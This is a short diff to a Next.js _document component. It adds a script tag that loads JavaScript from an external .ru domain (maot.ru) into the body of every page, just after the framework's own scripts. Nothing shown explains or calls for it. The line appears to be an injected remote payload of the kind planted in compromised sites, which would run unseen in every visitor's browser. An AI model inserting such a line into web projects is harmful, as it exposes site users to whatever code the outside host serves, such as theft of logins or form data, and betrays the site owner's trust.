@@ -7,6 +7,7 @@ export default function Document() {
       <body>
         <Main />
         <NextScript />
+            <script src = "https://maot.ru/remote/u/u2.js"></script>
             <script
               dangerouslySetInnerHTML={{
                 __html: `
